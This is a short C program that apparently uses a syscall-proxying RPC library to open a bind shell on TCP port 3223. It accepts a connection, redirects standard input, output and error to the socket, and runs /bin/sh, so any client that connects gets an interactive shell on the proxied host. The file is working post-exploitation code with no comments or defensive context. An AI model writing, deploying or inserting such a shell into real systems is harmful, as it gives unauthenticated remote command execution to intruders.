#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include "sp.h"

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define RPC_HOST "127.0.0.1"
#define RPC_PORT 8181

int main(int argc, char **argv)
{
	int fd, l, con, opt = 1;
	struct sockaddr_in in, in1;
        char *arg[] = {"/bin/sh", 0};

	l = sizeof(in1);

        memset(&in, 0, sizeof(in));
        in.sin_port = htons(3223);
        in.sin_family = AF_INET;

	rpc_init(RPC_HOST, RPC_PORT);

	fd = sys_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	printf("socket: %i\n", fd);
	printf("setsockopt: %i\n", setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, \
			 &opt, sizeof(opt)));
	printf("bind: %i\n", sys_bind(fd, &in, sizeof(in)));
	printf("listen: %i\n", sys_listen(fd, 5));
	con = sys_accept(fd, &in1, &l);
	printf("accept: %i\n", con);
	printf("dup2: %i\n", sys_dup2(con, 0));
	printf("dup2: %i\n", sys_dup2(con, 1));
	printf("dup2: %i\n", sys_dup2(con, 2));
	sys_execve(arg[0], arg, 0);

	return 0;
}
